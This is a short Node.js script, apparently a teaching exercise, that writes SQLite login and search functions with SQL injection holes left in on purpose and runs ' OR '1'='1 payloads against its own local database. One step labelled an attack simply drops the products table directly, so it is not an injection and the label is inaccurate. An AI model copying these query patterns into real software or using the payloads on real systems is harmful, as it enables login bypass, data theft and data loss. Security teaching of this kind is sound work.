const Database = require('better-sqlite3');
const db = new Database('nyondo_stock.db');

// Vulnerable search function
function searchProduct(name) {
  const query = `SELECT * FROM products WHERE name LIKE '%${name}%'`;
  return db.prepare(query).all();
}

// Vulnerable login function
function login(username, password) {
  const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
  return db.prepare(query).all();
}

// Attack 1: Bypass login with OR '1'='1'
console.log("Attack 1:", login("alice", "' OR '1'='1"));

// Attack 2: Extract all users by injecting OR
console.log("Attack 2:", login("bob", "' OR '1'='1"));

// Attack 3: Drop the products table
try {
  db.exec("DROP TABLE products");
  console.log("Attack 3: Products table dropped!");
} catch (err) {
  console.log("Attack 3 failed:", err.message);
}

// Attack 4: Malicious search
console.log("Attack 4:", searchProduct("' OR '1'='1"));
